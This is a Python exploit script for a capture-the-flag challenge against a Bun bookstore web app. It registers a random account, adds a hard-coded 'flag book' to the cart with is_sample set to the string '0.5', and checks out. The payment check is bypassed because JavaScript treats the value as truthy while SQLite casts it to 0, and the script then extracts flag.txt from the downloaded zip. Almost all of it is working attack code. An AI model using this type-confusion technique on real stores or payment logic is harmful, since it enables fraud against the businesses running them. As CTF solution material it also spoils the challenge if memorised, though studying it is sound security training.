#!/usr/bin/env python3
"""
Exploit for the Bun bookstore CTF challenge with updated filter.
Gets the flag book without sufficient balance by exploiting
type conversion differences between JavaScript's unary plus
and SQLite's integer conversion.
"""

import requests
import zipfile
import io
import sys
import random
import string
import json

def random_string(length=10):
    """Generate a random string for username/password."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def exploit(host):
    """
    Main exploit function.
    
    Args:
        host: Base URL of the target server (e.g., "http://localhost:3000")
    """
    base_url = host.rstrip('/')
    session = requests.Session()
    
    # Use a random username to avoid collisions
    username = random_string(10)
    password = random_string(10)
    
    print(f"[*] Target: {base_url}")
    print(f"[*] Using credentials: {username}:{password}")
    
    # Step 1: Register a new user
    print("[*] Registering new user...")
    register_data = {
        "username": username,
        "password": password
    }
    
    resp = session.post(f"{base_url}/register", data=register_data)
    
    if resp.status_code != 200:
        # If registration fails, try logging in (in case user already exists)
        print("[-] Registration failed, trying login...")
        login_data = {
            "username": username,
            "password": password
        }
        resp = session.post(f"{base_url}/login", data=login_data)
        
        if resp.status_code != 200:
            print(f"[-] Failed to register/login: {resp.text}")
            return False
    
    print("[+] Authentication successful")
    
    # Step 2: Add flag book to cart with is_sample as string "0.5"
    print("[*] Adding flag book to cart...")
    
    # Flag book ID from books.json
    FLAG_BOOK_ID = "2a16e349fb9045fa"
    
    cart_add_payload = {
        "products": [
            {
                "book_id": FLAG_BOOK_ID,
                "is_sample": "0.5"  # Critical: "0.5" converts to 0.5 (truthy) in JS, but to 0 in SQLite
            }
        ]
    }
    
    resp = session.post(f"{base_url}/cart/add", json=cart_add_payload)
    
    if resp.status_code != 200:
        print(f"[-] Failed to add to cart: {resp.status_code}")
        print(f"Response: {resp.text}")
        return False
    
    # Check for error in response
    try:
        resp_json = resp.json()
        if 'err' in resp_json:
            print(f"[-] Server error: {resp_json['err']}")
            return False
        print(f"[+] Cart addition successful. Remaining balance: {resp_json.get('remainingBalance', 'N/A')}")
    except:
        print("[+] Cart addition successful (non-JSON response)")
    
    # Step 3: Checkout and download the zip
    print("[*] Checking out...")
    resp = session.post(f"{base_url}/cart/checkout")
    
    if resp.status_code != 200:
        print(f"[-] Checkout failed: {resp.status_code}")
        print(f"Response: {resp.text[:200]}...")
        return False
    
    # Step 4: Extract flag from zip
    print("[*] Processing downloaded zip file...")
    
    try:
        zip_data = resp.content
        with zipfile.ZipFile(io.BytesIO(zip_data)) as zipf:
            # List all files in zip
            file_list = zipf.namelist()
            print(f"[+] Zip contains {len(file_list)} file(s): {file_list}")
            
            # Look for flag.txt
            if "flag.txt" in file_list:
                with zipf.open("flag.txt") as f:
                    flag = f.read().decode('utf-8').strip()
                    print(f"\n[+] FLAG FOUND: {flag}")
                    return True
            else:
                print("[-] flag.txt not found in zip archive")
                print("[*] Checking other files...")
                
                # Try to find any .txt files that might contain the flag
                for filename in file_list:
                    if filename.endswith('.txt'):
                        print(f"[*] Checking {filename}...")
                        with zipf.open(filename) as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            if "flag" in content.lower():
                                print(f"\n[+] Potential flag in {filename}:")
                                print(content[:500])
                                return True
                
                return False
    except Exception as e:
        print(f"[-] Error processing zip file: {e}")
        return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <host>")
        print(f"Example: {sys.argv[0]} http://localhost:3000")
        print(f"Example: {sys.argv[0]} http://127.0.0.1:3000")
        sys.exit(1)
    
    host = sys.argv[1]
    
    # Try the exploit
    if not exploit(host):
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
